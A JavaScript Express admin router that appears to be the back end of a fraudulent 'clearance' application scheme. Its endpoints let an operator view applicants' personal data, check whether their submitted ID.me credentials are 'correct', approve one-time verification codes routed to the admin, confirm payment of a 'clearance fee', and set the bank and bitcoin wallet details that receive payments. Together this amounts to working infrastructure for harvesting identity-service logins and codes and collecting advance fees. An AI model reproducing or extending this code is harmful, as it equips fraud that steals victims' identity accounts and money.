import { Router } from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import redis from '../redis.js';
import { adminMiddleware } from '../middleware/auth.js';
import { sendAdminEmail } from '../email.js';

const router = Router();

const getUser = async (id) => {
  const data = await redis.get(`user:${id}`);
  return data ? JSON.parse(data) : null;
};

router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Credentials required' });

    if (email === process.env.ADMIN_EMAIL && password === process.env.ADMIN_PASSWORD) {
      const token = jwt.sign({ id: 'admin', email, isAdmin: true }, process.env.JWT_SECRET, { expiresIn: '12h' });
      return res.json({ token, admin: { email, role: 'administrator' } });
    }

    const adminId = await redis.get(`admin:${email}`);
    if (adminId) {
      const adminData = await redis.get(`admin:user:${adminId}`);
      if (adminData) {
        const admin = JSON.parse(adminData);
        const valid = await bcrypt.compare(password, admin.password);
        if (valid) {
          const token = jwt.sign({ id: adminId, email, isAdmin: true }, process.env.JWT_SECRET, { expiresIn: '12h' });
          return res.json({ token, admin: { email, role: admin.role || 'officer' } });
        }
      }
    }

    res.status(401).json({ error: 'Invalid credentials' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/dashboard', adminMiddleware, async (req, res) => {
  try {
    const allUserIds = JSON.parse(await redis.get('all:userIds') || '[]');
    const users = [];
    for (const uid of allUserIds) {
      const u = await getUser(uid);
      if (u) {
        users.push({
          id: u.id, applicationNumber: u.applicationNumber, fullName: u.fullName, email: u.email, username: u.username,
          applyingFor: u.applyingFor, address: u.address, city: u.city, state: u.state, zipCode: u.zipCode,
          currentStage: u.currentStage, stageStatus: u.stageStatus,
          idmeVerified: u.idmeVerified, idmeSubmitted: u.idmeSubmitted,
          idmeStatus: u.idmeStatus, idmeDeclineMessage: u.idmeDeclineMessage,
          idmeCodeSent: u.idmeCodeSent, idmeCode: u.idmeCode,
          clearanceDuration: u.clearanceDuration, clearanceFee: u.clearanceFee,
          clearancePaymentVerified: u.clearancePaymentVerified,
          finalApproved: u.finalApproved, createdAt: u.createdAt, updatedAt: u.updatedAt
        });
      }
    }
    const pendingIdme = JSON.parse(await redis.get('admin:pendingIdme') || '[]');
    const pendingIdmeCodes = JSON.parse(await redis.get('admin:pendingIdmeCodes') || '[]');
    const pendingClearance = JSON.parse(await redis.get('admin:pendingClearance') || '[]');

    res.json({
      stats: {
        totalUsers: users.length,
        pendingIdme: pendingIdme.length, pendingIdmeCodes: pendingIdmeCodes.length,
        pendingClearance: pendingClearance.length, approved: users.filter(u => u.finalApproved).length
      },
      users, pendingIdme, pendingIdmeCodes, pendingClearance
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/users/:userId', adminMiddleware, async (req, res) => {
  try {
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });
    const { password, ...safe } = user;
    res.json({ user: safe });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/idme-approve-credentials/:userId', adminMiddleware, async (req, res) => {
  try {
    const { correct, message } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    if (correct) {
      user.idmeStatus = 'awaiting_code';
      user.idmeDeclineMessage = '';
      const sixDigit = Math.floor(100000 + Math.random() * 900000).toString();
      user.idmeCode = sixDigit;
      user.idmeCodeSent = true;
    } else {
      user.idmeStatus = 'declined';
      user.idmeDeclineMessage = message || 'Credentials rejected by administrator';
    }
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/idme-approve-code/:userId', adminMiddleware, async (req, res) => {
  try {
    const { approved } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    if (approved) {
      user.idmeVerified = true;
      user.idmeStatus = 'verified';
      user.currentStage = 2;
      user.stageStatus = 'clearance_pending';
      let codeQueue = JSON.parse(await redis.get('admin:pendingIdmeCodes') || '[]');
      codeQueue = codeQueue.filter(p => p.userId !== req.params.userId);
      await redis.set('admin:pendingIdmeCodes', JSON.stringify(codeQueue));
      let queue = JSON.parse(await redis.get('admin:pendingIdme') || '[]');
      queue = queue.filter(p => p.userId !== req.params.userId);
      await redis.set('admin:pendingIdme', JSON.stringify(queue));
    } else {
      user.idmeStatus = 'declined';
      user.idmeDeclineMessage = 'Verification code rejected';
    }
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/approve-clearance/:userId', adminMiddleware, async (req, res) => {
  try {
    const { approved } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.clearancePaymentVerified = !!approved;
    user.stageStatus = approved ? 'awaiting_final_approval' : 'clearance_rejected';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));

    let queue = JSON.parse(await redis.get('admin:pendingClearance') || '[]');
    queue = queue.filter(p => p.userId !== req.params.userId);
    await redis.set('admin:pendingClearance', JSON.stringify(queue));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/approve-final/:userId', adminMiddleware, async (req, res) => {
  try {
    const { approved } = req.body;
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.finalApproved = !!approved;
    user.currentStage = 4;
    user.stageStatus = approved ? 'approved' : 'rejected';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.params.userId}`, JSON.stringify(user));
    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/send-email/:userId', adminMiddleware, async (req, res) => {
  try {
    const { message } = req.body;
    if (!message || !message.trim()) return res.status(400).json({ error: 'Message is required' });

    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    await sendAdminEmail(user.email, user.fullName, message.trim());
    res.json({ success: true, message: 'Email sent successfully' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/payment-config', adminMiddleware, async (req, res) => {
  try {
    const config = JSON.parse(await redis.get('payment:config') || '{}');
    res.json({ config });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/payment-config', adminMiddleware, async (req, res) => {
  try {
    const { bankTransfer, crypto } = req.body;
    const config = {};

    if (bankTransfer) {
      config.bankTransfer = {
        available: !!bankTransfer.available,
        bankName: bankTransfer.bankName || '',
        accountName: bankTransfer.accountName || '',
        accountNumber: bankTransfer.accountNumber || '',
        routingNumber: bankTransfer.routingNumber || '',
        swiftCode: bankTransfer.swiftCode || '',
        instructions: bankTransfer.instructions || ''
      };
    }

    if (crypto) {
      config.crypto = {
        available: !!crypto.available,
        walletAddress: crypto.walletAddress || '',
        qrCodeImage: crypto.qrCodeImage || '',
        network: crypto.network || 'BTC',
        instructions: crypto.instructions || ''
      };
    }

    await redis.set('payment:config', JSON.stringify(config));
    res.json({ success: true, config });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.delete('/users/:userId', adminMiddleware, async (req, res) => {
  try {
    const user = await getUser(req.params.userId);
    if (!user) return res.status(404).json({ error: 'Not found' });

    await redis.del(`user:${req.params.userId}`);
    await redis.del(`email:${user.email}`);
    await redis.del(`username:${user.username}`);

    let allUserIds = JSON.parse(await redis.get('all:userIds') || '[]');
    allUserIds = allUserIds.filter(id => id !== req.params.userId);
    await redis.set('all:userIds', JSON.stringify(allUserIds));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

export default router;
